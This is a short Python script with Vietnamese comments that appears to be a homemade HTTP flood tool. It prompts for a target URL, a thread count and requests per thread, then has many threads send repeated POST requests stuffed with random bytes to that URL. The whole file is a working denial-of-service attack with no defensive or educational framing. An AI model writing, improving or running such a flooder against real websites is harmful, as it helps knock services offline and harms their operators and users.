import os
import requests
import random
import threading

# Mã ANSI cho màu sắc
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"  # Đặt lại màu về mặc định

# Xóa màn hình terminal
os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

# Nhập dữ liệu đầu vào
url = input("Nhập URL: ")
so_luong_luong = int(input("Số lượng luồng: "))
yeu_cau_moi_luong = int(input("Nhập số lượng yêu cầu trên mỗi luồng: "))

def gui_yeu_cau(ma_luong):
    for i in range(yeu_cau_moi_luong):
        try:
            du_lieu = random._urandom(10) * 1000
            phan_hoi = requests.post(url, data=du_lieu)
            # In ra trạng thái trên cùng một dòng với màu xanh
            print(f"\r{GREEN}Luồng {ma_luong}{RESET}")
        except Exception as e:
            # In ra lỗi trên cùng một dòng với màu đỏ
            print(f"\r{RED}Luồng {ma_luong}: Lỗi - {e}{RESET}", end='')

def main():
    cac_luong = []

    for i in range(so_luong_luong):
        luong = threading.Thread(target=gui_yeu_cau, args=(i + 1,))
        cac_luong.append(luong)
        luong.start()

    for luong in cac_luong:
        luong.join()

    # In thêm một dòng trống để đảm bảo không đè lên kết quả cuối cùng
    print()

if __name__ == "__main__":
    main()